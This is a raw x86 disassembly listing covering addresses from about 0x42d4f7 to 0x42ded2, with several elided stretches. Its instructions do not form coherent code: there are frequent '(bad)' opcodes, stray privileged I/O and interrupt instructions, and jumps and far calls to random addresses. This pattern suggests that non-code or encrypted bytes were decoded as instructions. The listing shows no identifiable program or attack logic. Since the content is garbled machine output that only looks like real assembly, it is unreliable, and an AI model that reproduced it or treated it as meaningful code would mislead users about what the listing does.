  42d4f7:	xor    ch,ah
  42d4f9:	nop
  42d4fa:	cmp    esi,DWORD PTR [eax+0xb923a89]
  42d500:	sar    dh,cl
  42d502:	shl    BYTE PTR [ecx-0x76],0x44
  42d506:	sbb    eax,0x58e5d161
  42d50b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d50c:	cld    
  42d50d:	push   ss
  42d50e:	rcl    BYTE PTR [edi+0x57],cl
	...
  42d574:	cdq    
  42d575:	cmc    
  42d576:	adc    BYTE PTR [ebx-0x12],0x77
  42d57a:	fcos   
  42d57c:	pop    ebp
  42d57d:	mov    ds:0xfa465ed5,eax
  42d583:	add    BYTE PTR [edi],ah
  42d585:	out    0x1,al
  42d587:	add    BYTE PTR ds:0xe4000001,al
  42d58d:	cli    
  42d58e:	loope  0x42d5c3
  42d590:	mov    es,esp
  42d592:	xor    cl,BYTE PTR ds:0x1d9dfb33
  42d598:	in     al,0xed
  42d59a:	push   ds
  42d59b:	sbb    BYTE PTR [ebx+0x486eaf76],0x4b
  42d5a2:	add    dl,bl
  42d5a4:	scas   al,BYTE PTR es:[edi]
  42d5a5:	fsubr  DWORD PTR [edi]
  42d5a7:	mov    al,0x5f
  42d5a9:	push   esi
  42d5aa:	jl     0x42d57a
  42d5ac:	xchg   ecx,eax
  42d5ad:	mov    cl,0x28
  42d5af:	pop    ebp
  42d5b0:	jle    0x42d5a8
  42d5b2:	fcomp  DWORD PTR [ecx-0x32]
  42d5b5:	ss and eax,0xa77d7308
  42d5bb:	adc    bl,ah
  42d5bd:	leave  
  42d5be:	sbb    bl,dl
  42d5c0:	sbb    ecx,ecx
  42d5c2:	jmp    0x42d605
  42d5c4:	shl    DWORD PTR [eax+0x2839b1c6],1
  42d5ca:	out    dx,eax
  42d5cb:	int3   
  42d5cc:	xchg   ecx,eax
  42d5cd:	pusha  
  42d5ce:	mov    bh,0x0
  42d5d0:	outs   dx,DWORD PTR ds:[esi]
  42d5d1:	les    ebx,FWORD PTR [edi-0x63bf2f00]
  42d5d7:	xlat   BYTE PTR ds:[ebx]
  42d5d8:	or     eax,0x88cc1f11
  42d5dd:	mov    ecx,0xf67e6393
  42d5e2:	daa    
  42d5e3:	mov    bh,0x42
  42d5e5:	gs mov eax,0x7be16413
  42d5eb:	iret   
  42d5ec:	mov    dl,0x81
  42d5ee:	add    edx,DWORD PTR [ebp-0x2a]
  42d5f1:	(bad)  
  42d5f2:	xchg   ecx,eax
  42d5f3:	jb     0x42d5da
  42d5f5:	ja     0x42d60c
  42d5f7:	push   ebp
  42d5f8:	or     DWORD PTR [edi-0x3f],eax
  42d5fb:	xlat   BYTE PTR ds:[ebx]
  42d5fc:	fnsave [edi]
  42d5fe:	dec    ebx
  42d5ff:	push   ebx
  42d600:	sub    al,0xc0
  42d602:	jge    0x42d681
  42d604:	jg     0x42d5d1
  42d606:	or     esi,DWORD PTR [eax]
  42d608:	mov    esp,0x39c6bb7a
  42d60d:	cmp    BYTE PTR [esp+eiz*2-0x64],bl
  42d611:	jecxz  0x42d59f
  42d613:	push   ebp
  42d614:	push   ss
  42d615:	jns    0x42d627
  42d617:	inc    eax
  42d618:	xchg   BYTE PTR [ebp+ebp*1-0x180cc1b9],ch
  42d61f:	clc    
  42d620:	add    dl,bh
  42d622:	popa   
  42d623:	push   ds
  42d624:	(bad)  
  42d625:	push   ebx
  42d626:	xchg   esi,eax
  42d627:	ds inc edx
  42d629:	mov    ds:0xe507d6e4,eax
  42d62e:	fs add esp,edi
  42d631:	or     DWORD PTR ds:0xcc3705a2,0x30
  42d638:	ins    BYTE PTR es:[edi],dx
  42d639:	or     dh,BYTE PTR [ebp-0x5b]
  42d63c:	sar    esp,cl
  42d63e:	outs   dx,DWORD PTR ds:[esi]
  42d63f:	mov    esi,0x4717348c
  42d644:	inc    edx
  42d645:	fwait
  42d646:	jge    0x42d5fa
  42d648:	cmp    al,0x31
  42d64a:	ror    esi,1
  42d64c:	jns    0x42d602
  42d64e:	std    
  42d64f:	mov    dh,0x10
  42d651:	jne    0x42d69d
  42d653:	ffree  st(7)
  42d655:	out    0x4c,eax
  42d657:	xchg   ebp,eax
  42d658:	fiadd  WORD PTR [eax]
  42d65a:	jae    0x42d68a
  42d65c:	ss in  al,0x6c
  42d65f:	pop    esi
  42d660:	inc    esi
  42d661:	adc    eax,0xeb560835
  42d666:	clc    
  42d667:	popa   
  42d668:	pop    edx
  42d669:	fiadd  WORD PTR [eax+0x186e093a]
  42d66f:	test   BYTE PTR [edi+0x33],al
  42d672:	(bad)  
  42d673:	mov    ds:0xb7d3fb8,al
  42d678:	lock xchg esi,eax
  42d67a:	test   al,0xf
  42d67c:	cwde   
  42d67d:	add    al,0xf5
  42d67f:	(bad)  
  42d680:	xor    al,0xee
  42d682:	jno    0x42d619
  42d684:	aas    
  42d685:	lahf   
  42d686:	mov    dl,0x8f
  42d688:	shr    DWORD PTR [ebp+0x78b80d25],1
  42d68e:	and    al,0x9a
  42d690:	dec    edx
	...
  42d6f1:	add    BYTE PTR [eax],al
  42d6f3:	add    bl,dh
  42d6f5:	add    esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0x38
  42d701:	int    0x39
  42d703:	sti    
  42d704:	sub    al,0xe7
  42d706:	add    DWORD PTR [eax],eax
  42d708:	add    eax,0x46000001
  42d70d:	out    dx,eax
  42d70e:	(bad)  
  42d710:	mov    eax,ds:0xbddcdd9f
  42d715:	jg     0x42d719
  42d717:	popf   
  42d718:	push   0x66
  42d71a:	mov    cl,BYTE PTR [eax]
  42d71c:	mov    bl,0x75
  42d71e:	push   eax
  42d71f:	dec    edi
  42d720:	retf   
  42d721:	mov    ?,WORD PTR [edi]
  42d723:	lahf   
  42d724:	dec    esp
  42d725:	pop    ebp
  42d726:	ss xchg edx,eax
  42d728:	sbb    ecx,ecx
  42d72a:	lds    edx,FWORD PTR [ebx]
  42d72c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d72d:	mov    ecx,DWORD PTR [ebp-0x76]
  42d730:	scas   al,BYTE PTR es:[edi]
  42d731:	mov    eax,0xd8524db6
  42d736:	cmp    dl,BYTE PTR [ebx]
  42d738:	(bad)  
  42d739:	and    al,0x6c
  42d73b:	aaa    
  42d73c:	jnp    0x42d728
  42d73e:	into   
  42d73f:	cmp    DWORD PTR [edx+eax*2+0x55],edi
  42d743:	jge    0x42d791
  42d745:	fmul   QWORD PTR es:0xb0b47c6d
  42d74c:	scas   al,BYTE PTR es:[edi]
  42d74d:	dec    DWORD PTR [eax+eiz*8]
  42d750:	push   ds
  42d751:	jp     0x42d736
  42d753:	push   ds
  42d754:	fs in  al,0x63
  42d757:	push   ss
  42d758:	or     eax,0xb7500de6
  42d75d:	das    
  42d75e:	sub    eax,DWORD PTR [esi]
  42d760:	or     edx,DWORD PTR [eax-0x30]
  42d763:	or     DWORD PTR [edx-0xa65009],esi
  42d769:	imul   ebx,DWORD PTR [edx],0x3e8148c6
  42d76f:	inc    edi
  42d770:	dec    ebx
  42d771:	add    esp,eax
  42d773:	mov    ecx,0x677a797d
  42d778:	inc    eax
  42d779:	lea    edx,[ebx+0x6c2535d3]
  42d77f:	arpl   WORD PTR [edx],dx
  42d781:	dec    ebx
  42d782:	mov    al,ds:0x97936039
  42d787:	dec    esi
  42d788:	ficomp DWORD PTR [ecx+eiz*1+0x55]
  42d78c:	ret    0x49ce
  42d78f:	cmp    BYTE PTR [ebp+0x6c],al
  42d792:	pop    ebp
  42d793:	inc    eax
  42d794:	adc    ecx,esi
  42d796:	mov    eax,0xd6c353b4
  42d79b:	rcr    DWORD PTR [edi],0xb4
  42d79e:	retf   
  42d79f:	call   0xc43b99bf
  42d7a4:	cmc    
  42d7a5:	jnp    0x42d80e
  42d7a7:	sbb    al,BYTE PTR [esi+0x32a1a918]
  42d7ad:	adc    BYTE PTR [ebp+ebx*1+0x16af704a],al
  42d7b4:	rcr    BYTE PTR [edx],0x9c
  42d7b7:	sub    ebp,eax
  42d7b9:	sub    eax,DWORD PTR [ebx-0x343a7762]
  42d7bf:	bound  esp,QWORD PTR [edx-0x66]
  42d7c2:	data16 or BYTE PTR [ecx-0x9546bfb],0xbc
  42d7ca:	stc    
  42d7cb:	popa   
  42d7cc:	jg     0x42d7fe
  42d7ce:	rcr    DWORD PTR ds:[ebx],0x2
  42d7d2:	adc    DWORD PTR [eax],esi
  42d7d4:	push   0xd3c4f875
  42d7d9:	inc    ebp
  42d7da:	mov    ah,0xcb
  42d7dc:	pop    eax
  42d7dd:	cdq    
  42d7de:	std    
  42d7df:	stos   DWORD PTR es:[edi],eax
  42d7e0:	retf   
  42d7e1:	sub    edi,DWORD PTR [edi+0xf9116f8]
  42d7e7:	(bad)  
  42d7e8:	mov    ecx,0xe204b2cf
  42d7ed:	sub    BYTE PTR [ecx-0x5a],cl
  42d7f0:	aaa    
  42d7f1:	icebp  
  42d7f2:	mov    dh,0xfb
  42d7f4:	cmp    DWORD PTR [ebx],ebx
  42d7f6:	aad    0x9c
  42d7f8:	push   esi
  42d7f9:	cmp    al,0x5a
  42d7fb:	daa    
  42d7fc:	mov    ds:0x473391a4,al
  42d801:	aaa    
  42d802:	retf   0x7608
  42d805:	mov    eax,0xe62181b3
  42d80a:	lahf   
  42d80b:	ficomp DWORD PTR [eax+eiz*1+0x58]
  42d80f:	jnp    0x42d878
	...
  42d871:	add    BYTE PTR [eax],al
  42d873:	add    BYTE PTR [esi-0x62a06765],dl
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0xa4c6961a
  42d881:	add    al,0x90
  42d883:	loop   0x42d8b6
  42d885:	call   0x147d88b
  42d88a:	add    BYTE PTR [eax],al
  42d88c:	mov    esi,0xad995a58
  42d891:	push   ebp
  42d892:	xor    al,0xf7
  42d894:	and    BYTE PTR [edx-0x2c],dl
  42d897:	xor    ah,ch
  42d899:	jo     0x42d8cd
  42d89b:	xchg   esi,eax
  42d89c:	fsubp  st(2),st
  42d89e:	pop    ss
  42d89f:	arpl   WORD PTR [di-0x18],dx
  42d8a3:	xchg   esi,eax
  42d8a4:	int    0xff
  42d8a6:	push   edx
  42d8a7:	leave  
  42d8a8:	mov    edx,edx
  42d8aa:	add    dl,BYTE PTR ds:0xf6e250ef
  42d8b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d8b1:	mov    bh,0xab
  42d8b3:	xchg   edx,eax
  42d8b4:	mov    ebp,0xa586758f
  42d8b9:	out    0x4,al
  42d8bb:	leave  
  42d8bc:	push   esp
  42d8bd:	imul   edx,DWORD PTR [eax+0x45],0xa258e586
  42d8c4:	jns    0x42d8bc
  42d8c6:	pop    edi
  42d8c7:	mov    dh,0xaf
  42d8c9:	lahf   
  42d8ca:	iret   
  42d8cb:	cmp    esi,DWORD PTR [eax+eiz*4+0x2febd934]
  42d8d2:	jbe    0x42d890
  42d8d4:	scas   eax,DWORD PTR es:[edi]
  42d8d5:	test   al,0xad
  42d8d7:	dec    ebp
  42d8d8:	xchg   ebp,eax
  42d8d9:	(bad)  
  42d8da:	push   edi
  42d8db:	test   al,al
  42d8dd:	cmp    eax,0xdf2b9d09
  42d8e2:	mov    ah,0x99
  42d8e4:	mov    bl,0x11
  42d8e7:	add    al,0x7a
  42d8e9:	mov    ch,0x69
  42d8eb:	mov    ds,WORD PTR [ebp-0x14]
  42d8ee:	leave  
  42d8ef:	sub    al,BYTE PTR [ebp+ecx*4+0x3ad4037a]
  42d8f6:	rcr    edx,1
  42d8f8:	sub    edi,DWORD PTR [eax]
  42d8fa:	mov    ecx,0x4babbbfd
  42d8ff:	and    BYTE PTR [eax],dh
  42d901:	jmp    0x6f05a28
  42d906:	into   
  42d907:	or     BYTE PTR [esi+0x68120f59],dl
  42d90d:	or     BYTE PTR [eax],0xd5
  42d910:	add    dh,bh
  42d912:	lods   al,BYTE PTR ds:[esi]
  42d913:	fcomp  QWORD PTR [esi+edx*2]
  42d916:	xlat   BYTE PTR ds:[ebx]
  42d917:	daa    
  42d918:	jl     0x42d8ee
  42d91a:	xchg   ecx,eax
  42d91b:	mov    ebp,DWORD PTR [esi]
  42d91d:	push   eax
  42d91e:	mov    ebx,0x2d695783
  42d923:	repnz std 
  42d925:	loope  0x42d8b4
  42d927:	in     al,dx
  42d928:	loop   0x42d92f
  42d92a:	mov    dl,0x95
  42d92c:	xchg   ebx,eax
  42d92d:	aas    
  42d92e:	fdivr  QWORD PTR [esi-0x1c8c40f8]
  42d934:	and    dh,cl
  42d936:	cli    
  42d937:	xor    eax,0x5e15484a
  42d93c:	in     al,0xc7
  42d93e:	inc    ecx
  42d93f:	aam    0x25
  42d941:	out    0xcf,al
  42d943:	xchg   ebp,eax
  42d944:	jp     0x42d903
  42d946:	retf   0x3ef4
  42d949:	adc    DWORD PTR [eax-0x4e89d71],esp
  42d94f:	mov    bl,0x25
  42d951:	popa   
  42d952:	pushf  
  42d953:	push   es
  42d954:	push   es
  42d955:	in     al,dx
  42d956:	cmp    ecx,esp
  42d958:	push   esp
  42d959:	int    0x8d
  42d95b:	les    ebx,FWORD PTR [ebx+0x4307a661]
  42d961:	hlt    
  42d962:	aam    0xd1
  42d964:	in     al,dx
  42d965:	mov    eax,ds:0xac8c2c62
  42d96a:	jp     0x42d95a
  42d96c:	scas   eax,DWORD PTR es:[edi]
  42d96d:	push   ebx
  42d96e:	imul   esi,DWORD PTR [ecx],0x969c1041
  42d974:	pushf  
  42d975:	push   ecx
  42d976:	and    eax,0x6163b652
  42d97b:	push   ss
  42d97c:	scas   al,BYTE PTR es:[edi]
  42d97d:	jmp    0x32d6:0x256039d6
  42d984:	jecxz  0x42d93c
  42d986:	jno    0x42d921
  42d988:	jae    0x42d97e
  42d98a:	call   0x573f727d
  42d98f:	xor    DWORD PTR [edi+0x0],esp
	...
  42d9f1:	add    BYTE PTR [eax],al
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	pop    ds
  42da01:	data16 adc al,BYTE PTR [edi]
  42da04:	ss jmp 0x147da0b
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	xchg   esp,eax
  42da0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da0f:	add    BYTE PTR [ecx+0x2cf13315],dl
  42da15:	push   esi
  42da16:	xchg   BYTE PTR [esi],dl
  42da18:	add    esi,DWORD PTR [edi]
  42da1a:	sbb    eax,0xca75bb7f
  42da1f:	mov    ds:0xc10fce00,al
  42da24:	dec    edi
  42da25:	mov    ds:0xed7bb20a,al
  42da2a:	jns    0x42da2b
  42da2c:	lahf   
  42da2d:	dec    ebx
  42da2e:	shr    DWORD PTR [esi],0x1d
  42da31:	or     al,0x47
  42da33:	iret   
  42da34:	outs   dx,DWORD PTR cs:[esi]
  42da36:	mov    ch,0xc
  42da38:	jnp    0x42da6b
  42da3a:	xor    eax,0x42f09dcc
  42da3f:	in     al,dx
  42da40:	xlat   BYTE PTR ds:[ebx]
  42da41:	nop
  42da42:	rol    DWORD PTR [eax-0x3a],1
  42da45:	pop    edx
  42da46:	pop    ecx
  42da47:	repz push eax
  42da49:	in     al,0xb4
  42da4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42da4c:	inc    ecx
  42da4d:	cmp    ch,BYTE PTR [edi+0x3f]
  42da50:	add    ebx,ebp
  42da52:	daa    
  42da53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da54:	ucomiss xmm5,DWORD PTR [ebx]
  42da57:	retf   
  42da58:	sub    al,0xe8
  42da5a:	ret    0x95
  42da5d:	int3   
  42da5e:	loop   0x42da4d
  42da60:	xchg   edx,eax
  42da61:	fstp   QWORD PTR [eax-0xbb2b535]
  42da67:	dec    ebx
  42da68:	rcr    DWORD PTR [edi+0x49],0x4e
  42da6c:	mov    WORD PTR [esi-0x5d7593ba],?
  42da72:	xchg   esp,eax
  42da73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42da74:	mov    ebx,DWORD PTR [esi-0x1af34266]
  42da7a:	pop    edx
  42da7b:	push   esp
  42da7c:	push   esi
  42da7d:	cli    
  42da7e:	pop    edx
  42da7f:	rcl    DWORD PTR [esi-0x66b3310e],1
  42da85:	jp     0x42da57
  42da87:	arpl   WORD PTR [ebx+0x13fd7072],sp
  42da8d:	adc    eax,0xe92bfe6b
  42da92:	(bad)  
  42da93:	cs or  eax,ebx
  42da96:	div    DWORD PTR [edi]
  42da98:	inc    edx
  42da99:	mov    eax,ds:0x4f20991c
  42da9e:	adc    eax,0x40acf243
  42daa3:	sbb    ch,BYTE PTR [esi]
  42daa5:	fld    DWORD PTR [ebx-0x58]
  42daa8:	pop    ss
  42daa9:	mov    al,ds:0x1c775165
  42daae:	lods   eax,DWORD PTR ds:[esi]
  42daaf:	in     eax,dx
  42dab0:	push   ebx
  42dab1:	sti    
  42dab2:	adc    al,0xc1
  42dab4:	mov    edi,0xa9cf5df8
  42dab9:	mov    bh,0x44
  42dabb:	pop    ss
  42dabc:	repnz fstp DWORD PTR [edi-0x3c5477b7]
  42dac3:	mov    eax,ds:0x1d643721
  42dac8:	sub    cl,BYTE PTR [ecx-0x7f]
  42dacb:	inc    eax
  42dacc:	cmp    al,0x81
  42dace:	cmp    BYTE PTR [eax+0x3],bl
  42dad1:	jmp    0x42daea
  42dad3:	hlt    
  42dad4:	xor    esp,DWORD PTR [eax+0x66]
  42dad7:	dec    edi
  42dad8:	repnz cli 
  42dada:	aad    0x3d
  42dadc:	jg     0x42dab1
  42dade:	mov    edi,0x5b3dd8bb
  42dae3:	data16 (bad) 
  42dae6:	popa   
  42dae7:	js     0x42dab5
  42dae9:	sbb    eax,0xa8baec39
  42daee:	xchg   esp,eax
  42daef:	inc    edx
  42daf0:	aam    0x5d
  42daf2:	and    BYTE PTR [edx],cl
  42daf4:	loop   0x42db3e
  42daf6:	push   edi
  42daf7:	shr    DWORD PTR [edi+esi*2+0x47],0x82
  42dafc:	iret   
  42dafd:	mov    bh,0xde
  42daff:	jne    0x42dab9
  42db01:	ficom  DWORD PTR [eax+0x69af1e46]
  42db07:	pop    ebx
  42db08:	les    edx,FWORD PTR [eax]
  42db0a:	or     eax,0x5eb714d3
  42db0f:	in     al,dx
  42db10:	pop    ss
	...
  42db71:	add    BYTE PTR [eax],al
  42db73:	add    BYTE PTR [eax-0x2093e086],dh
  42db79:	ins    DWORD PTR es:[edi],dx
  42db7a:	repz (bad) 
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db78
  42db81:	adc    DWORD PTR [edi-0xa],ebp
  42db84:	cmp    ebp,edx
  42db86:	add    DWORD PTR [eax],eax
  42db88:	add    eax,0x66000001
  42db8d:	fs in  al,dx
  42db8f:	inc    esp
  42db90:	sub    bl,0x20
  42db93:	sub    eax,0x681c27a0
  42db98:	jmp    0x1b0d2407
  42db9d:	popf   
  42db9e:	pop    esp
  42db9f:	mov    ebp,0xbce279ba
  42dba4:	out    0x98,eax
  42dba6:	mov    bh,0xae
  42dba8:	dec    ecx
  42dba9:	mov    dl,0x54
  42dbab:	psubq  mm3,QWORD PTR [eax+0x19]
  42dbaf:	lods   al,BYTE PTR ds:[si]
  42dbb1:	(bad)  
  42dbb2:	clc    
  42dbb3:	gs loope 0x42dbf9
  42dbb6:	xor    esp,DWORD PTR [esi+0x6a]
  42dbb9:	mov    DWORD PTR [esi],eax
  42dbbb:	sub    eax,0x7a1428e3
  42dbc0:	cmp    eax,0xe0f99dbb
  42dbc5:	lods   eax,DWORD PTR ds:[esi]
  42dbc6:	add    esi,0x63
  42dbc9:	mov    edx,0x3e80d190
  42dbce:	aad    0x40
  42dbd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dbd1:	stos   DWORD PTR es:[edi],eax
  42dbd2:	pop    ecx
  42dbd3:	int3   
  42dbd4:	outs   dx,DWORD PTR ds:[esi]
  42dbd5:	test   DWORD PTR [ecx+0x5e],0xfd8ae31
  42dbdc:	adc    esi,ebx
  42dbde:	aaa    
  42dbdf:	stos   BYTE PTR es:[edi],al
  42dbe0:	fist   DWORD PTR [ebp+0xe3cc109]
  42dbe6:	fwait
  42dbe7:	in     al,0xd9
  42dbe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dbea:	(bad)  
  42dbeb:	and    al,0x53
  42dbed:	jae    0x42dc41
  42dbef:	fnstsw WORD PTR [edx-0x23]
  42dbf2:	stc    
  42dbf3:	cmc    
  42dbf4:	xchg   edx,eax
  42dbf5:	and    al,0xf2
  42dbf7:	xchg   ebx,eax
  42dbf8:	test   DWORD PTR ds:0x225f0abc,eax
  42dbfe:	inc    ebx
  42dbff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dc00:	cdq    
  42dc01:	cmp    eax,0xebd41466
  42dc06:	clc    
  42dc07:	stos   DWORD PTR es:[edi],eax
  42dc08:	fidiv  DWORD PTR [ebx]
  42dc0a:	jo     0x42dc32
  42dc0c:	mov    eax,0xa589d9ff
  42dc11:	sbb    ch,BYTE PTR ds:0xdeb13615
  42dc17:	or     DWORD PTR [ecx],esp
  42dc19:	add    eax,0x397cec91
  42dc1e:	shr    DWORD PTR [ebp+eiz*2-0x6c],cl
  42dc22:	dec    esp
  42dc23:	les    eax,FWORD PTR [ecx]
  42dc25:	sub    al,0xf7
  42dc27:	mov    ch,0xa0
  42dc29:	jle    0x42dc0a
  42dc2b:	(bad)  
  42dc2c:	mov    cl,0xdd
  42dc2e:	pushf  
  42dc2f:	es or  al,0x8f
  42dc32:	sbb    eax,0x5746b6db
  42dc37:	mov    ah,0x69
  42dc39:	ss ffreep st(5)
  42dc3c:	pop    ebx
  42dc3d:	loop   0x42dc37
  42dc3f:	mov    ?,WORD PTR [edx-0x16]
  42dc42:	test   eax,0xa06a71ab
  42dc47:	and    BYTE PTR ds:0x156e778b,al
  42dc4d:	clc    
  42dc4e:	sbb    BYTE PTR [edi-0x37538da8],bh
  42dc54:	(bad)
  42dc57:	outs   dx,BYTE PTR ds:[esi]
  42dc58:	jmp    0x42dbef
  42dc5a:	pop    eax
  42dc5b:	aas    
  42dc5c:	and    ch,BYTE PTR [ebx-0x6bfdaf16]
  42dc62:	mov    DWORD PTR [edx+0x3fb2b699],edx
  42dc68:	pop    es
  42dc69:	in     al,dx
  42dc6a:	xor    ebx,DWORD PTR [esi+0x5d25eb57]
  42dc70:	(bad)
  42dc73:	or     ah,BYTE PTR [ebp+0x6c]
  42dc76:	shr    DWORD PTR [ecx+0x7d],cl
  42dc79:	pop    ds
  42dc7a:	pop    ebx
  42dc7b:	push   ds
  42dc7c:	add    bl,cl
  42dc7e:	cmp    eax,0xffffffb8
  42dc81:	lea    ebx,[esi-0x30c6d915]
  42dc87:	pop    edx
  42dc88:	add    DWORD PTR [ecx-0x7c2619d8],0xffffffa0
  42dc8f:	(bad)  
  42dc90:	in     al,dx
	...
  42dcf1:	add    BYTE PTR [eax],al
  42dcf3:	add    BYTE PTR [ecx],bh
  42dcf5:	mov    bh,0x6d
  42dcf7:	pxor   mm3,mm7
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	and    edi,ecx
  42dd02:	or     ecx,DWORD PTR [eax+0x1eb40]
  42dd08:	add    eax,0xa3000001
  42dd0d:	push   cs
  42dd0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dd0f:	(bad)  
  42dd10:	popf   
  42dd11:	ins    DWORD PTR es:[edi],dx
  42dd12:	in     eax,0x39
  42dd14:	rcl    DWORD PTR [ebx+0x64fe2036],cl
  42dd1a:	loop   0x42dd1f
  42dd1c:	adc    dl,bl
  42dd1e:	pusha  
  42dd1f:	jmp    0x41ba:0x6949ab1a
  42dd26:	cs xchg esi,eax
  42dd28:	jg     0x42dd0c
  42dd2a:	jbe    0x42dcc4
  42dd2c:	pop    ss
  42dd2d:	push   esi
  42dd2e:	(bad)  
  42dd2f:	sbb    eax,0xe00ba7f9
  42dd34:	not    BYTE PTR [ecx+0x2d]
  42dd37:	retf   0x494e
  42dd3a:	xchg   edx,eax
  42dd3b:	mov    al,ds:0xb1b83a75
  42dd40:	rcl    DWORD PTR es:[esi-0x51],cl
  42dd44:	pop    eax
  42dd45:	jo     0x42dd7f
  42dd47:	xor    eax,0xdd300e37
  42dd4c:	or     bl,cl
  42dd4e:	adc    eax,0xcc52ed32
  42dd53:	outs   dx,DWORD PTR ds:[esi]
  42dd54:	repz sub ecx,esi
  42dd57:	xlat   BYTE PTR ds:[ebx]
  42dd58:	mov    ds:0xa1909440,al
  42dd5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dd5e:	mov    ?,WORD PTR [ecx-0x29]
  42dd61:	or     al,BYTE PTR [edx]
  42dd63:	sub    DWORD PTR [eax],ecx
  42dd65:	stc    
  42dd66:	fisttp WORD PTR [ebx-0x70]
  42dd69:	leave  
  42dd6a:	and    dh,BYTE PTR [edx+0xdba46eb]
  42dd70:	aam    0x1
  42dd72:	xchg   edi,eax
  42dd73:	add    al,0xa3
  42dd75:	cli    
  42dd76:	in     al,0x1
  42dd78:	es inc edi
  42dd7a:	cmp    BYTE PTR [esi],0xf4
  42dd7d:	mov    ds:0xd457d07b,al
  42dd82:	ror    esp,1
  42dd84:	bound  eax,QWORD PTR [edx+0x1ec56873]
  42dd8a:	pop    edx
  42dd8b:	adc    al,0x63
  42dd8d:	scas   eax,DWORD PTR es:[edi]
  42dd8e:	in     al,dx
  42dd8f:	jo     0x42dde3
  42dd91:	push   esi
  42dd92:	jno    0x42ddfb
  42dd94:	jg     0x42dd9e
  42dd96:	sub    DWORD PTR [edi+0x4b1a2ab0],ebp
  42dd9c:	sbb    bh,BYTE PTR [esi+0x6b]
  42dd9f:	aas    
  42dda0:	lahf   
  42dda1:	idiv   DWORD PTR [ecx-0x4]
  42dda4:	adc    DWORD PTR [eax-0x5765f86a],ebx
  42ddaa:	imul   edi,DWORD PTR [eax+0x9dabca1],0xba3bc4ea
  42ddb4:	push   edx
  42ddb5:	sub    DWORD PTR [edx],eax
  42ddb7:	clc    
  42ddb8:	adc    dl,BYTE PTR [esi+ecx*8]
  42ddbb:	gs push ecx
  42ddbd:	fisttp DWORD PTR [ebx-0x4d]
  42ddc0:	inc    esp
  42ddc1:	and    eax,DWORD PTR [ebx+0x3947db91]
  42ddc7:	or     edi,DWORD PTR [esi+edi*2]
  42ddca:	dec    edx
  42ddcb:	loope  0x42dd9a
  42ddcd:	mov    ds:0xfed19e79,al
  42ddd2:	rol    eax,1
  42ddd4:	cdq    
  42ddd5:	ret    
  42ddd6:	in     eax,0x66
  42ddd8:	xchg   ebx,eax
  42ddd9:	je     0xbff2318
  42dddf:	pop    esp
  42dde0:	int    0x3f
  42dde2:	pop    edx
  42dde3:	sahf   
  42dde4:	sub    BYTE PTR [ebx-0x4bcecb48],ah
  42ddea:	in     al,dx
  42ddeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ddec:	add    al,0x74
  42ddee:	icebp  
  42ddef:	pop    ecx
  42ddf0:	cmp    dh,BYTE PTR [eax+ecx*1]
  42ddf3:	cmp    BYTE PTR [esi+ecx*8+0x43ff0af2],ch
  42ddfa:	dec    eax
  42ddfb:	int3   
  42ddfc:	push   0xffffff99
  42ddfe:	enter  0xcad2,0xcc
  42de02:	mov    edx,0x1d4cab15
  42de07:	fwait
  42de08:	je     0x42de58
  42de0a:	jae    0x42de0a
  42de0c:	jle    0x42ddf5
  42de0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42de0f:	and    eax,0x88
	...
  42de74:	out    0x82,al
  42de76:	lods   eax,DWORD PTR ds:[esi]
  42de77:	xor    ebp,ebp
  42de79:	aas    
  42de7a:	(bad)  
  42de7b:	xlat   BYTE PTR ds:[ebx]
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	pop    DWORD PTR [edi]
  42de82:	outs   dx,DWORD PTR ds:[esi]
  42de83:	mov    BYTE PTR [ebp-0x14],0x1
  42de87:	add    BYTE PTR ds:0xd9000001,al
  42de8d:	sub    ebx,eax
  42de8f:	jo     0x42deb6
  42de91:	(bad)  
  42de92:	sbb    eax,0x29f09021
  42de97:	test   eax,0xb63ead
  42de9c:	dec    ebx
  42de9d:	push   ss
  42de9e:	jecxz  0x42de26
  42dea0:	xchg   edi,eax
  42dea1:	loop   0x42deb0
  42dea3:	add    bh,BYTE PTR [ecx+0x26]
  42dea6:	aaa    
  42dea7:	mov    ebp,0x180b4a1d
  42deac:	inc    eax
  42dead:	or     ecx,DWORD PTR [ecx+0x2c]
  42deb0:	clc    
  42deb1:	jmp    0xc8c2:0xdb3dc797
  42deb8:	call   0x7f20360a
  42debd:	lods   al,BYTE PTR ds:[esi]
  42debe:	aad    0xfa
  42dec0:	popf   
  42dec1:	inc    ebx
  42dec2:	mov    BYTE PTR [ebp-0x6b],ah
  42dec5:	outs   dx,DWORD PTR ds:[esi]
  42dec6:	bnd ret 0xd3aa
  42deca:	pop    edx
  42decb:	cmp    BYTE PTR [ecx+0x7dea68b7],cl
  42ded1:	icebp  
  42ded2:	adc    eax,0xf9e06662
